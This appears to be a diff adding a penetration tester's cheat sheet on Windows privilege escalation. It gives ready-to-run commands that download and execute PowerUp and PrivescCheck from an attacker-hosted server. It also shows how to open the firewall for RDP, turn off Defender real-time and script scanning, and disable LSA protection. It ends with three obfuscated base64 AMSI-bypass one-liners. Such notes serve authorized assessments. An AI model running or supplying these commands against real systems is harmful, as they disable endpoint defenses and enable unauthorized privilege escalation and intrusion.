@@ -1,0 +1,112 @@
+Windows Privilege Escalation
+
+
+# Overview
+
+Local privilege escalation tooling, firewall changes for access, and endpoint evasion before running scripts or binaries on target.
+
+
+# Related Notes
+
+windows.txt              Host recon and situational awareness
+windows-credentials.txt  Credential dumping after admin access
+windows-lateral.txt      RDP and remote access after privesc
+passwords.txt            Offline hash cracking
+
+
+# Privilege Escalation Tools
+
+## Overview
+
+Transfer tools to the target or host them on an HTTP server at <attacker IP>.
+
+## Commands
+
+C# / binaries — /opt/SharpCollection/
+    SharpUp.exe audit
+    Seatbelt.exe -group=user -outputfile="C:\Users\Public\sb-user.txt"
+    Seatbelt.exe -group=system -outputfile="C:\Users\Public\sb-system.txt"
+    Seatbelt.exe -group=remote -outputfile="C:\Users\Public\sb-remote.txt"
+    Watson.exe
+
+PEASS-ng — /opt/PEASS-ng/
+    winPEASx64.exe cmd
+    winPEASx64.exe quiet cmd
+    # PowerShell: /opt/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1
+
+PowerShell — host from attacker:
+    cd /opt/PowerSploit/Privesc/
+    python3 -m http.server 80
+    powershell -nop -exec bypass
+    iex (iwr -UseBasicParsing http://<attacker IP>/PowerUp.ps1); Invoke-AllChecks
+
+    cd /opt/PrivescCheck/
+    python3 -m http.server 80
+    powershell -nop -exec bypass
+    iex (iwr -UseBasicParsing http://<attacker IP>/PrivescCheck.ps1); Invoke-PrivescCheck
+
+Python — missing patches:
+    cd /opt/Windows-Exploit-Suggester-NG
+    ./wes.py --update
+    systeminfo > systeminfo.txt
+    scp systeminfo.txt kali@<attacker IP>:/opt/Windows-Exploit-Suggester-NG/
+    ./wes.py systeminfo.txt
+
+## Validation / False Positives
+
+winPEAS and SharpUp report potential issues — confirm exploitable paths manually before reporting.
+An unquoted service path still requires write access to the service binary location.
+
+
+# Firewall and RDP
+
+## Commands
+
+Allow RDP and start Terminal Services:
+    netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
+    net start TermService
+
+Disable firewall (noisy):
+    netsh advfirewall firewall set allprofiles state off
+
+
+# Evasion
+
+## Overview
+
+Check endpoint controls before loading PowerShell tooling. Run AMSI bypass only when needed and only on authorized assessments.
+
+## Commands
+
+Defender exclusions:
+    reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
+
+Installed AV:
+    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
+
+Defender preferences (requires admin, noisy):
+    Set-MpPreference -DisableScriptScanning $True
+    Set-MpPreference -DisableRealtimeMonitoring $True
+    Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+
+LSA protection (reboot often required):
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
+
+AMSI bypass — https://github.com/HernanRodriguez1/Bypass-AMSI
+Open PowerShell as Administrator, then run one option:
+
+Option 1:
+[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
+
+Option 2:
+&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )
+
+Option 3:
+${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
+${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
+${1}.SetValue($null,$true)
+
+## Validation / False Positives
+
+WDigest UseLogonCredential is ineffective on modern Windows by default — do not rely on it.
+AMSI bypass success means scripts load — still confirm the privesc or dump technique works end to end.
